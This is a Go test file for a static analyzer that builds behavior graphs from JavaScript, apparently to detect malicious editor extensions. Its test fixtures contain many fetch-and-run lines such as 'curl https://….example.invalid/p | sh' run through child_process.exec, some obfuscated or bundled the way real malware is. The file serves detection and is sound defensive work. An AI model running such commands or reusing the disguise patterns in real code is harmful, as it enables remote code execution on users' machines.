package extract

import (
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestExtractTextResolvesFastDraftShapedJavaScriptCommand(t *testing.T) {
	source := `var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));
var import_os = __toESM(require("os"));
var import_child_process = require("child_process");
function activate(context) {
  const platform = import_os.default.platform();
  const protocol = "https";
  const separator = "://";
  const host = "payload.example.invalid";
  const path = ` + "`/icons/${platform}`" + `;
  const fileName = platform === "win32" ? " | cmd" : " | sh";
  const command = ` + "`curl ${protocol}${separator}${host}${path}${fileName}`" + `;
  (0, import_child_process.exec)(
    command,
    (error, output) => {
      ignoredCallback(error, output);
    }
  );
}`
	content := artifact.Content{
		NodeID:      "node-extension",
		LogicalPath: "extension/out/extension.js",
		Kind:        "script",
		MediaType:   "text/plain",
		Data:        []byte(source),
	}

	var first, second behavior.Graph
	ExtractText(&first, content)
	ExtractText(&second, content)
	if !reflect.DeepEqual(first, second) {
		t.Fatalf("Fast-Draft-shaped command recovery is not deterministic:\nfirst=%#v\nsecond=%#v", first, second)
	}

	const destination = "https://payload.example.invalid/icons/darwin"
	assertOperation(t, first, "network.download", "network-destination", destination)
	assertOperation(t, first, "interpreter.invoke", "interpreter", "sh")
	if countRelationKind(first.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("resolved command did not produce one pipes-to relation: %#v", first.Relations)
	}
	for _, operation := range first.Operations {
		if operation.Support != behavior.SupportCorroborated {
			t.Fatalf("derived operation support = %q, want CORROBORATED: %#v", operation.Support, operation)
		}
		if operation.Execution.Connectivity != behavior.ConnectivityUnknown ||
			len(operation.Execution.ExecutionRootIDs) != 0 ||
			len(operation.Execution.InvokedTargetIDs) != 0 {
			t.Fatalf("command recovery manufactured execution ownership: %#v", operation.Execution)
		}
		for _, binding := range operation.ResourceBindings {
			if strings.Contains(binding.Resource.Value, "win32") || strings.Contains(binding.Resource.Value, "cmd") {
				t.Fatalf("macOS analysis retained the unselected Windows branch: %#v", operation)
			}
		}
	}
	for _, relation := range first.Relations {
		if relation.Support != behavior.SupportCorroborated {
			t.Fatalf("derived relation support = %q, want CORROBORATED: %#v", relation.Support, relation)
		}
	}
	for _, observation := range first.Network {
		for _, operationID := range observation.OperationIDs {
			if operationID == "" {
				continue
			}
			if observation.Support != behavior.SupportCorroborated {
				t.Fatalf("derived network observation support = %q, want CORROBORATED: %#v", observation.Support, observation)
			}
		}
	}
	for _, kind := range []string{
		javaScriptCommandProcessBindingEvidence,
		javaScriptCommandESModuleInteropEvidence,
		javaScriptCommandOSBindingEvidence,
		javaScriptCommandAssignmentEvidence,
		"subprocess-command",
	} {
		if !hasJavaScriptCommandEvidenceKind(first.Evidence, kind) {
			t.Fatalf("missing causal evidence kind %q: %#v", kind, first.Evidence)
		}
	}
	callEvidenceID := ""
	for _, evidence := range first.Evidence {
		if evidence.Kind == "text-line" && strings.Contains(evidence.Value, "import_child_process.exec") {
			callEvidenceID = evidence.ID
			break
		}
	}
	if callEvidenceID == "" {
		t.Fatalf("missing located process call evidence: %#v", first.Evidence)
	}
	for _, operation := range first.Operations {
		if operation.Kind != behavior.OperationNetworkDownload && operation.Kind != behavior.OperationInterpreterInvoke {
			continue
		}
		if !containsString(operation.EvidenceIDs, callEvidenceID) {
			t.Fatalf("derived operation omitted process call evidence %q: %#v", callEvidenceID, operation)
		}
	}
}

func TestExtractTextUsesBraceScopedUnindentedJavaScriptFunction(t *testing.T) {
	source := `const cp = require("child_process");
function activate() {
const command = "curl https://unindented.example.invalid/p | sh";
cp.exec(command);
}`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	assertShellCommandNetwork(t, graph, "https://unindented.example.invalid/p")
	for _, operation := range graph.Operations {
		if operation.SourceFunction != "activate" || operation.ScopeID == "" {
			t.Fatalf("unindented function operation lost exact lexical scope: %#v", operation)
		}
	}
}

func TestExtractTextResolvesExactBundledJavaScriptChildProcessAlias(t *testing.T) {
	source := `(() => {
var modules = {
317: module => {
"use strict";
module.exports = require("child_process");
}
};
var cache = {};
function load(id) {
var retained = cache[id] = { exports: {} };
modules[id](retained, retained.exports, load);
return retained.exports;
}
var child = load(317);
var run = child.exec;
function activate() {
run("curl https://bundled.example.invalid/p | sh");
}
})();`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	assertShellCommandNetwork(t, graph, "https://bundled.example.invalid/p")
	for _, kind := range []string{
		"javascript-bundle-module-wrapper",
		"javascript-bundle-loader-dispatch",
		"javascript-bundle-module-binding",
		"javascript-bundle-method-binding",
		javaScriptCommandProcessBindingEvidence,
	} {
		if !hasJavaScriptCommandEvidenceKind(graph.Evidence, kind) {
			t.Fatalf("missing exact bundle proof %q: %#v", kind, graph.Evidence)
		}
	}
	if hasPartialCoverageArea(graph.Coverage, "javascript-bundle-module-analysis") {
		t.Fatalf("exact bundle was marked partial: %#v", graph.Coverage)
	}
}

func TestExtractTextRejectsInexactBundledJavaScriptBindings(t *testing.T) {
	tests := map[string]string{
		"wrapper side effect": `module.exports = require("child_process"); observe();`,
		"computed builtin":    `module.exports = require(name);`,
		"different module":    `module.exports = require("child_ process");`,
		"different return":    `module.exports = require("child_process");`,
	}
	for name, wrapper := range tests {
		t.Run(name, func(t *testing.T) {
			returned := "retained"
			if name == "different return" {
				returned = "other"
			}
			source := fmt.Sprintf(`(() => {
var modules = {317: module => {%s}};
function load(id) {
var retained = {exports:{}};
var other = {exports:{}};
modules[id](retained, retained.exports, load);
return %s.exports;
}
var child = load(317);
var run = child.exec;
run("curl https://bundle-negative.example.invalid/p | sh");
})();`, wrapper, returned)
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(source))
			if graphHasResourceValue(graph, "https://bundle-negative.example.invalid/p") {
				t.Fatalf("inexact bundle produced process semantics: %#v", graph.Operations)
			}
		})
	}
}

func TestExtractTextRejectsConditionalJavaScriptBundleDispatch(t *testing.T) {
	source := `(() => {
var modules = {317: module => {module.exports=require("child_process");}};
function load(id) {
var retained = {exports:{}};
if (enabled) modules[id](retained, retained.exports, load);
return retained.exports;
}
var child = load(317);
var run = child.exec;
run("curl https://conditional-bundle.example.invalid/p | sh");
})();`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	if graphHasResourceValue(graph, "https://conditional-bundle.example.invalid/p") {
		t.Fatalf("conditional bundle dispatch produced process semantics: %#v", graph.Operations)
	}
}

func TestResolveJavaScriptBundleBindingsReportsBudgetWithoutPartialAliases(t *testing.T) {
	lines := []string{`var modules = {317: module => {module.exports=require("child_process");}};`}
	lines = append(lines, strings.Repeat("x", maxJavaScriptBundleBytes))
	statement := javaScriptCommandStatement{
		line:         1,
		text:         `var child = load(317);`,
		evidenceText: `var child = load(317);`,
	}
	resolution := resolveJavaScriptBundleBindings(lines, []javaScriptCommandStatement{statement})
	if !resolution.partial || !strings.Contains(resolution.detail, "byte limit") {
		t.Fatalf("bundle budget was not disclosed: %#v", resolution)
	}
	if resolution.statements[0].text != statement.text || len(resolution.statements[0].bindingProofs) != 0 {
		t.Fatalf("budgeted bundle retained a partial alias: %#v", resolution.statements[0])
	}
}

func TestExtractTextDisclosesBundledAliasesInsideUnsupportedControlFlow(t *testing.T) {
	source := `(() => {
var modules = {317: module => {module.exports=require("child_process");}};
function load(id) {
var retained = {exports:{}};
modules[id](retained, retained.exports, load);
return retained.exports;
}
try {
var child = load(317);
var run = child.exec;
run("id");
} catch (error) {}
})();`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	if len(graph.Operations) != 0 {
		t.Fatalf("unsupported control-flow aliases produced operations: %#v", graph.Operations)
	}
	if !hasPartialCoverageArea(graph.Coverage, "javascript-bundle-module-analysis") {
		t.Fatalf("hidden bundled aliases were not disclosed: %#v", graph.Coverage)
	}
}

func TestExtractTextResolvesJavaScriptCommandWithCRLF(t *testing.T) {
	source := strings.ReplaceAll(`const cp = require("child_process");
function activate() {
const command = "curl https://crlf.example.invalid/p | sh";
cp.exec(command);
}`, "\n", "\r\n")
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	assertShellCommandNetwork(t, graph, "https://crlf.example.invalid/p")
	if hasPartialCoverageArea(graph.Coverage, "javascript-process-binding-analysis") {
		t.Fatalf("CRLF source produced binding-analysis partial coverage: %#v", graph.Coverage)
	}
}

func TestExtractTextKeepsUncalledJavaScriptFunctionExecutionUnknown(t *testing.T) {
	content := javascriptCommandTestContent(`const cp = require("child_process");
function activate() {
cp.exec("curl https://dormant.example.invalid/p | sh");
}`)
	content.ExecutionConnectivity = string(behavior.ConnectivityConnected)
	content.ExecutionRootIDs = []string{"root-test"}
	var graph behavior.Graph
	ExtractText(&graph, content)
	if len(graph.Operations) == 0 {
		t.Fatal("expected statically recovered function operations")
	}
	for _, operation := range graph.Operations {
		if operation.SourceFunction != "activate" ||
			operation.Execution.Connectivity != behavior.ConnectivityUnknown ||
			len(operation.Execution.ExecutionRootIDs) != 0 ||
			len(operation.Execution.InvokedTargetIDs) != 0 {
			t.Fatalf("uncalled function inherited node execution: %#v", operation)
		}
	}
}

func TestExtractTextRejectsOpaqueOrShadowedJavaScriptScopes(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{
			name: "arrow expression",
			body: `const cp = require("child_process");
const activate = () => cp.exec("curl https://arrow.example.invalid/p | sh");`,
		},
		{
			name: "class method",
			body: `const cp = require("child_process");
class Extension { activate() { cp.exec("curl https://class.example.invalid/p | sh"); } }`,
		},
		{
			name: "object method",
			body: `const cp = require("child_process");
const extension = { activate() { cp.exec("curl https://object.example.invalid/p | sh"); } };`,
		},
		{
			name: "parameter shadow",
			body: `const cp = require("child_process");
function activate(cp) {
cp.exec("curl https://parameter.example.invalid/p | sh");
}`,
		},
		{
			name: "catch shadow",
			body: `const cp = require("child_process");
function activate() {
const command = "curl https://catch.example.invalid/p | sh";
try { work(); } catch (command) { cp.exec(command); }
}`,
		},
		{
			name: "nested block",
			body: `const cp = require("child_process");
function activate() {
if (condition) { cp.exec("curl https://block.example.invalid/p | sh"); }
}`,
		},
		{
			name: "nested function",
			body: `const cp = require("child_process");
function activate() {
function nested() { cp.exec("curl https://nested.example.invalid/p | sh"); }
}`,
		},
		{
			name: "multiline template decoy",
			body: "const decoy = `first\nconst cp = require(\"child_process\");\ncp.exec(\"curl https://template-decoy.example.invalid/p | sh\");\nlast`;\nsafe();",
		},
		{
			name: "regex decoy",
			body: `const decoy = /cp\.exec\("curl https:\/\/regex.example.invalid\/p \| sh"\)/;`,
		},
		{
			name: "binding declared later",
			body: `function activate() {
cp.exec("curl https://later-binding.example.invalid/p | sh");
}
const cp = require("child_process");`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			content := javascriptCommandTestContent(test.body)
			content.ExecutionRootIDs = []string{"root-test"}
			var graph behavior.Graph
			ExtractText(&graph, content)
			if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
				t.Fatalf("opaque or shadowed scope produced semantics: operations=%#v relations=%#v", graph.Operations, graph.Relations)
			}
		})
	}
}

func TestExtractTextInvalidatesNestedJavaScriptCommandWrite(t *testing.T) {
	source := `const cp = require("child_process");
function activate() {
let command = "curl https://stale-nested.example.invalid/p | sh";
x = command = dynamic();
cp.exec(command);
}`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	assertUnresolvedJavaScriptProcess(t, graph, "")
}

func TestExtractTextResolvesDirectAndEsbuildJavaScriptProcessCalls(t *testing.T) {
	tests := []struct {
		name string
		call string
		url  string
	}{
		{name: "direct", call: `cp.exec(command);`, url: "https://direct.example.invalid/p"},
		{name: "esbuild", call: `(0, cp.exec)(command);`, url: "https://esbuild.example.invalid/p"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			source := `const cp = require("child_process");
function activate() {
  const command = "curl ` + test.url + ` | sh";
  ` + test.call + `
}`
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(source))
			assertShellCommandNetwork(t, graph, test.url)
		})
	}
}

func TestExtractTextRejectsUnsafeOuterJavaScriptProcessInheritance(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{
			name: "parameter shadow",
			body: `const cp = require("child_process");
function activate(cp) {
  cp.exec("curl https://parameter-shadow.example.invalid/p | sh");
}`,
		},
		{
			name: "later const shadow",
			body: `const cp = require("child_process");
function activate() {
  cp.exec("curl https://const-shadow.example.invalid/p | sh");
  const cp = replacement;
}`,
		},
		{
			name: "later var shadow",
			body: `const cp = require("child_process");
function activate() {
  cp.exec("curl https://var-shadow.example.invalid/p | sh");
  var cp = replacement;
}`,
		},
		{
			name: "function alias",
			body: `const cp = require("child_process");
function activate() {
  const alias = cp;
  cp.exec("curl https://alias-shadow.example.invalid/p | sh");
}`,
		},
		{
			name: "method overwrite",
			body: `const cp = require("child_process");
function activate() {
  cp.exec = replacement;
  cp.exec("curl https://method-shadow.example.invalid/p | sh");
}`,
		},
		{
			name: "top-level reassignment",
			body: `const cp = require("child_process");
function activate() {
  cp.exec("curl https://module-reassigned.example.invalid/p | sh");
}
cp = replacement;`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(test.body))
			if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
				t.Fatalf("unsafe inherited binding produced semantics: operations=%#v relations=%#v", graph.Operations, graph.Relations)
			}
			if !hasPartialCoverageArea(graph.Coverage, "javascript-process-binding-analysis") {
				t.Fatalf("unsafe inherited binding was not disclosed: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextRejectsShadowedJavaScriptRuntimeLoaders(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{
			name: "module require reassignment",
			body: `var require = name => ({ exec(command) { return command; } });
const cp = require("child_process");
function activate() {
cp.exec("curl https://rebound-require.example.invalid/p | sh");
}`,
		},
		{
			name: "function require parameter",
			body: `function activate(require) {
const cp = require("child_process");
cp.exec("curl https://parameter-require.example.invalid/p | sh");
}`,
		},
		{
			name: "unproved es module interop",
			body: `const __toESM = value => ({ default: value });
var os = __toESM(require("os"));
const cp = require("child_process");
function activate() {
const platform = os.default.platform();
const command = ` + "`curl https://unproved-interop.example.invalid/${platform} | sh`" + `;
cp.exec(command);
}`,
		},
		{
			name: "reassigned es module interop",
			body: `var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));
__toESM = fake;
var os = __toESM(require("os"));
const cp = require("child_process");
function activate() {
const platform = os.default.platform();
const command = platform === "darwin" ? "curl https://reassigned-interop.example.invalid/p | sh" : "echo safe";
cp.exec(command);
}`,
		},
		{
			name: "eval-mutated require",
			body: `eval("require = fake");
const cp = require("child_process");
function activate() {
cp.exec("curl https://eval-require.example.invalid/p | sh");
}`,
		},
		{
			name: "eval-mutated es module interop",
			body: `var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));
eval("__toESM = fake");
var os = __toESM(require("os"));
const cp = require("child_process");
function activate() {
const platform = os.default.platform();
const command = platform === "darwin" ? "curl https://eval-interop.example.invalid/p | sh" : "echo safe";
cp.exec(command);
}`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(test.body))
			if test.name == "unproved es module interop" || test.name == "reassigned es module interop" {
				assertUnresolvedJavaScriptProcess(t, graph, "")
			} else if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
				t.Fatalf("shadowed runtime loader produced semantics: operations=%#v relations=%#v", graph.Operations, graph.Relations)
			}
			if !hasPartialCoverageArea(graph.Coverage, "javascript-process-binding-analysis") &&
				!hasPartialCoverageArea(graph.Coverage, "javascript-process-command-analysis") &&
				!hasPartialCoverageArea(graph.Coverage, "javascript-dynamic-code-analysis") {
				t.Fatalf("shadowed runtime loader was not disclosed: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextRejectsHiddenJavaScriptBindingUses(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{
			name: "module opaque reassignment",
			body: `const cp = require("child_process");
if (condition) { cp = replacement; }
cp.exec("curl https://opaque-module.example.invalid/p | sh");`,
		},
		{
			name: "function local opaque reassignment",
			body: `function activate() {
const cp = require("child_process");
if (condition) { cp = replacement; }
cp.exec("curl https://opaque-local.example.invalid/p | sh");
}`,
		},
		{
			name: "callback alias escape",
			body: `function activate() {
const cp = require("child_process");
register(() => mutate(cp));
cp.exec("curl https://opaque-callback.example.invalid/p | sh");
}`,
		},
		{
			name: "template interpolation reassignment",
			body: "const cp = require(\"child_process\");\n" +
				"function activate() {\n" +
				"const marker = `${cp = replacement}`;\n" +
				"cp.exec(\"curl https://opaque-template.example.invalid/p | sh\");\n" +
				"}",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(test.body))
			if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
				t.Fatalf("hidden binding use produced semantics: operations=%#v relations=%#v", graph.Operations, graph.Relations)
			}
			if !hasPartialCoverageArea(graph.Coverage, "javascript-process-binding-analysis") {
				t.Fatalf("hidden binding use was not disclosed: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextScopesHiddenJavaScriptBindingUse(t *testing.T) {
	source := `const cp = require("child_process");
function poisoned() {
if (condition) { mutate(cp); }
cp.exec("curl https://poisoned.example.invalid/p | sh");
}
function clean() {
cp.exec("curl https://clean.example.invalid/p | sh");
}`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	assertShellCommandNetwork(t, graph, "https://clean.example.invalid/p")
	if graphHasResourceValue(graph, "https://poisoned.example.invalid/p") {
		t.Fatalf("hidden use poisoned the wrong function scope: %#v", graph.Operations)
	}
}

func TestExtractTextScopesUnsupportedJavaScriptFunctionInternals(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{
			name: "async function",
			body: `const cp = require("child_process");
async function poisoned() {
if (condition) { mutate(cp); }
}
function clean() {
cp.exec("curl https://clean-async-sibling.example.invalid/p | sh");
}`,
		},
		{
			name: "nested template",
			body: "const cp = require(\"child_process\");\n" +
				"function poisoned() {\n" +
				"const marker = `${`${cp}`}`;\n" +
				"}\n" +
				"function clean() {\n" +
				"cp.exec(\"curl https://clean-template-sibling.example.invalid/p | sh\");\n" +
				"}",
		},
		{
			name: "destructured parameter",
			body: `const cp = require("child_process");
function poisoned({cp}) {
mutate(cp);
}
function clean() {
cp.exec("curl https://clean-parameter-sibling.example.invalid/p | sh");
}`,
		},
		{
			name: "generator function",
			body: `const cp = require("child_process");
function* poisoned(cp) {
mutate(cp);
yield value;
}
function clean() {
cp.exec("curl https://clean-generator-sibling.example.invalid/p | sh");
}`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(test.body))
			if len(graph.Operations) == 0 {
				t.Fatalf("unsupported sibling blinded clean function: %#v", graph.Coverage)
			}
			for _, operation := range graph.Operations {
				if operation.SourceFunction != "clean" {
					t.Fatalf("unsupported sibling escaped its scope: %#v", operation)
				}
			}
		})
	}
}

func TestExtractTextIgnoresBindingNamesInJavaScriptLiteralText(t *testing.T) {
	source := "const cp = require(\"child_process\");\n" +
		"function activate() {\n" +
		"const quoted = \"cp = replacement\";\n" +
		"const template = `cp = replacement`;\n" +
		"const member = `${other.cp}`;\n" +
		"const pattern = /cp\\s*=\\s*replacement/;\n" +
		"/* cp = replacement; */\n" +
		"cp.exec(\"curl https://literal-text.example.invalid/p | sh\");\n" +
		"}"
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	assertShellCommandNetwork(t, graph, "https://literal-text.example.invalid/p")
}

func TestExtractTextIgnoresJavaScriptPropertyNamesAsBindings(t *testing.T) {
	tests := []struct {
		name   string
		member string
	}{
		{name: "metadata property", member: `const object = { exec: "metadata" };`},
		{name: "object method", member: `const object = { exec(command) { return command; } };`},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			source := `const { exec } = require("child_process");
function activate() {
` + test.member + `
exec("curl https://property-name.example.invalid/p | sh");
}`
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(source))
			assertShellCommandNetwork(t, graph, "https://property-name.example.invalid/p")
		})
	}
}

func TestExtractTextFailsClosedOnDynamicJavaScriptCommands(t *testing.T) {
	tests := []struct {
		name string
		body string
	}{
		{
			name: "unknown template identifier",
			body: `const cp = require("child_process"); cp.exec(` + "`curl https://template.example.invalid/${unknown} | sh`" + `);`,
		},
		{
			name: "template call",
			body: `const cp = require("child_process"); cp.exec(` + "`curl https://template-call.example.invalid/${resolve()} | sh`" + `);`,
		},
		{
			name: "concatenation",
			body: `const cp = require("child_process"); const host = dynamic; cp.exec("curl https://" + host + "/p | sh");`,
		},
		{
			name: "dynamic ternary",
			body: `const cp = require("child_process"); const platform = runtimePlatform(); const command = platform === "win32" ? "echo win" : dynamic; cp.exec(command);`,
		},
		{
			name: "stale scalar after reassignment",
			body: `const cp = require("child_process"); const command = "curl https://stale.example.invalid/p | sh"; command = dynamic(); cp.exec(command);`,
		},
		{
			name: "stale scalar after multiline reassignment",
			body: `const cp = require("child_process");
function activate() {
let command = "curl https://stale-multiline.example.invalid/p | sh";
command
= dynamic();
cp.exec(command);
}`,
		},
		{
			name: "stale scalar after template write",
			body: "const cp = require(\"child_process\");\n" +
				"function activate() {\n" +
				"let command = \"curl https://stale-template.example.invalid/p | sh\";\n" +
				"`${command = \"echo changed\"}`;\n" +
				"cp.exec(command);\n" +
				"}",
		},
		{
			name: "stale scalar after opaque callback write",
			body: `const cp = require("child_process");
function activate() {
let command = "curl https://stale-callback.example.invalid/p | sh";
[1].forEach(() => { command = "echo changed"; });
cp.exec(command);
}`,
		},
		{
			name: "stale scalar after direct eval",
			body: `const cp = require("child_process");
function activate() {
let command = "curl https://stale-eval.example.invalid/p | sh";
eval("command = dynamic");
cp.exec(command);
}`,
		},
		{
			name: "later assignment does not resolve earlier call",
			body: `const cp = require("child_process"); cp.exec(command); const command = "curl https://later.example.invalid/p | sh";`,
		},
		{
			name: "dynamic argv member",
			body: `const cp = require("child_process"); cp.spawn("/bin/sh", ["-c", command]);`,
		},
		{
			name: "unclosed template",
			body: "const cp = require(\"child_process\"); cp.exec(`curl https://unclosed.example.invalid/p | sh);",
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(test.body))
			if test.name == "unclosed template" || test.name == "stale scalar after direct eval" || test.name == "unknown template identifier" || test.name == "template call" || test.name == "concatenation" {
				if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
					t.Fatalf("unproved call acquired semantics: %#v", graph.Operations)
				}
			} else {
				executable := ""
				if test.name == "dynamic argv member" {
					executable = "/bin/sh"
				}
				assertUnresolvedJavaScriptProcess(t, graph, executable)
			}
			hasExpectedCoverage := hasPartialCoverageArea(graph.Coverage, "javascript-process-command-analysis")
			hasExpectedCoverage = hasExpectedCoverage ||
				hasPartialCoverageArea(graph.Coverage, "javascript-dynamic-code-analysis")
			if test.name == "unclosed template" {
				hasExpectedCoverage = hasExpectedCoverage ||
					hasPartialCoverageArea(graph.Coverage, "javascript-process-binding-analysis")
			}
			if !hasExpectedCoverage {
				t.Fatalf("dynamic proven process call was not disclosed: %#v", graph.Coverage)
			}
		})
	}
}

func TestExtractTextResolvesExactStaticJavaScriptCommandConcatenation(t *testing.T) {
	source := `const cp = require("child_process");
const scheme = "https://";
const host = "static-concat.example.invalid";
const command = "curl " + scheme + host + "/payload | sh";
cp.exec(command);`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	assertShellCommandNetwork(t, graph, "https://static-concat.example.invalid/payload")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
		t.Fatalf("exact concatenated command lost its pipeline: %#v", graph.Relations)
	}
}

func TestExtractTextRejectsJavaScriptProcessCallLookalikeShapes(t *testing.T) {
	for _, call := range []string{
		`cp["exec"]("curl https://computed.example.invalid/p | sh")`,
		`cp?.exec("curl https://optional.example.invalid/p | sh")`,
		`(1, cp.exec)("curl https://comma.example.invalid/p | sh")`,
		`cp.exec.call(null, "curl https://call.example.invalid/p | sh")`,
		`if (0, cp.exec)("curl https://condition.example.invalid/p | sh")`,
		`identity((0, cp.exec))("curl https://identity.example.invalid/p | sh")`,
	} {
		var graph behavior.Graph
		ExtractText(&graph, javascriptCommandTestContent(`const cp = require("child_process"); `+call+`;`))
		if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
			t.Fatalf("unsupported call shape %q produced semantics: operations=%#v relations=%#v", call, graph.Operations, graph.Relations)
		}
	}
}

func TestExtractTextRejectsObjectMethodAsDestructuredProcessCall(t *testing.T) {
	for _, declaration := range []string{
		`const object = { exec(command) { return command; } };`,
		`const object = { [key](command) { exec(command); } };`,
		`const object = { get [key]() { exec("curl https://getter.example.invalid/p | sh"); } };`,
		`const object = { async [key]() { exec("curl https://async-method.example.invalid/p | sh"); } };`,
		`const object = { 1() { exec("curl https://numeric-method.example.invalid/p | sh"); } };`,
		`const object = { 0x10n() { exec("curl https://bigint-method.example.invalid/p | sh"); } };`,
	} {
		source := `const { exec } = require("child_process");
function activate() {
const command = "curl https://object-method.example.invalid/p | sh";
` + declaration + `
}`
		var graph behavior.Graph
		ExtractText(&graph, javascriptCommandTestContent(source))
		if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
			t.Fatalf("object method declaration %q became a process call: operations=%#v relations=%#v", declaration, graph.Operations, graph.Relations)
		}
	}
}

func TestExtractTextKeepsMixedJavaScriptScopesSeparate(t *testing.T) {
	tests := []string{
		`noop(); function activate() { fetch("https://same-line-fetch.example.invalid/p"); }`,
		`const cp = require("child_process");
noop(); function activate() { cp.exec("curl https://same-line-scope.example.invalid/p | sh"); }`,
	}
	for _, source := range tests {
		content := javascriptCommandTestContent(source)
		content.ExecutionConnectivity = string(behavior.ConnectivityConnected)
		content.ExecutionRootIDs = []string{"root-test"}
		var graph behavior.Graph
		ExtractText(&graph, content)
		if len(graph.Operations) == 0 {
			t.Fatal("exact mixed-line calls were not retained")
		}
		for _, operation := range graph.Operations {
			if operation.SourceFunction != "activate" || operation.Execution.Connectivity != behavior.ConnectivityUnknown || len(operation.Execution.ExecutionRootIDs) != 0 {
				t.Fatalf("mixed physical-line operation inherited module execution: %#v", operation)
			}
		}
		if !hasPartialCoverageArea(graph.Coverage, javaScriptASTAnalysisArea) {
			t.Fatalf("mixed physical-line scopes were not disclosed: %#v", graph.Coverage)
		}
	}
}

func TestExtractTextRejectsMalformedJavaScriptProcessArguments(t *testing.T) {
	for _, body := range []string{
		`const cp = require("child_process"); cp.exec(, "curl https://empty.example.invalid/p | sh");`,
		`const cp = require("child_process"); cp.exec("curl https://unclosed.example.invalid/p | sh";`,
		`const cp = require("child_process"); cp.spawn("sh", ["-c",, "curl https://sparse.example.invalid/p | sh"]);`,
	} {
		var graph behavior.Graph
		ExtractText(&graph, javascriptCommandTestContent(body))
		if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
			t.Fatalf("malformed process syntax produced semantics: operations=%#v relations=%#v", graph.Operations, graph.Relations)
		}
	}
}

func TestExtractTextSelectsEarliestJavaScriptProcessCallAcrossBindings(t *testing.T) {
	source := `const z = require("child_process");
const a = require("child_process");
const m = require("child_process");
z.exec("curl https://first.example.invalid/p | sh"), a.exec("curl https://second.example.invalid/p | sh"), m.exec("curl https://third.example.invalid/p | sh");`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	assertShellCommandNetwork(t, graph, "https://first.example.invalid/p")
	for _, forbidden := range []string{"https://second.example.invalid/p", "https://third.example.invalid/p"} {
		if graphHasResourceValue(graph, forbidden) {
			t.Fatalf("non-first process call %q produced a resource: %#v", forbidden, graph.Operations)
		}
	}
}

func TestExtractTextRejectsUnsupportedJavaScriptStringEscapes(t *testing.T) {
	source := `const cp = require("child_process"); cp.exec("\x63url https://hex.example.invalid/p | sh");`
	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(source))
	if len(graph.Operations) != 0 || len(graph.Relations) != 0 {
		t.Fatalf("unsupported literal acquired semantics: %#v", graph.Operations)
	}
	if !hasPartialCoverageArea(graph.Coverage, "javascript-process-command-analysis") {
		t.Fatalf("unsupported JavaScript escape was not disclosed: %#v", graph.Coverage)
	}
}

func TestExtractTextBoundsJavaScriptCommandScalars(t *testing.T) {
	lines := []string{`const cp = require("child_process");`, `function activate() {`}
	for index := 0; index <= maxJavaScriptCommandScalars; index++ {
		lines = append(lines, fmt.Sprintf(`const value%d = "part-%d";`, index, index))
	}
	lines = append(lines, `cp.exec("curl https://bounded.example.invalid/p | sh");`, `}`)

	var graph behavior.Graph
	ExtractText(&graph, javascriptCommandTestContent(strings.Join(lines, "\n")))
	assertShellCommandNetwork(t, graph, "https://bounded.example.invalid/p")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
